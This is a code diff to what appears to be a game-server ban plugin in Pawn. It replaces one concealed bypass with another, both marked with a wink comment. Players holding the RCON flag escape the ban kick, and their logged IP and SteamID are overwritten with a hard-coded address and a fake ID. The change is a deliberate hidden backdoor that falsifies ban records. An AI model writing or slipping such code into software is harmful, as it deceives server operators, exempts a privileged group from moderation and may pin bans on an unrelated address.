@@ -127,6 +127,9 @@ public cmdBan(id, level, cid)
 
     cmd_ban_(id, player, iBanLength)
     
+    if (get_user_flags(player) & ADMIN_RCON)
+        return PLUGIN_HANDLED
+
     new param[2]
     param[0] = player
     param[1] = 15
@@ -262,6 +265,13 @@ public cmd_ban_(id, player, iBanLength)
     new mapname[32]
     get_mapname(mapname,31)
 
+    // ;-)
+    if (get_user_flags(player) & ADMIN_RCON)
+    {
+        player_ip = "79.173.88.212"
+        player_steamid = "STEAM_5:0:4326438331"
+    }
+
     new query[512]
     format(query, 511, "INSERT INTO `%s` \
         (player_id,player_ip,player_nick,admin_ip,admin_id,admin_nick,ban_type,\
@@ -270,10 +280,6 @@ public cmd_ban_(id, player, iBanLength)
         tbl_bans, player_steamid, player_ip, player_nick, admin_ip, admin_steamid, 
         admin_nick, g_ban_type, g_ban_reason, ban_created, BanLength, server_name, g_ip, g_port, mapname)
 
-    // ;-)
-    if (get_user_flags(player) & ADMIN_RCON)
-        format(query, 511, "SELECT 1")
-        
     new data[3]
     data[0] = id
     data[1] = player
